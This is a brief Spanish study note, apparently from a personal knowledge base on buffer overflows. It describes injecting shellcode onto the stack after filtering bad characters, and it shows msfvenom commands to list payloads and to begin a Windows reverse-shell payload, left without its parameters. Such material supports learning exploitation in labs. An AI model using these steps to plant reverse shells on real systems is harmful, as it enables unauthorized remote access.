---
Tema: "[[Buffer Overflow]]"
---
Una vez que tenemos el payload con los badchars filtrados la idea es meter  un payload malicioso o shellcode a la pila ESP

lo haremos con una de las herrmientas de metasploit el cual es [[msfvenom]]

para buscar payloads
```sh
msfvenom -l payloads
```


```sh
msfvenom -p windows/shell_reverse_tcp
```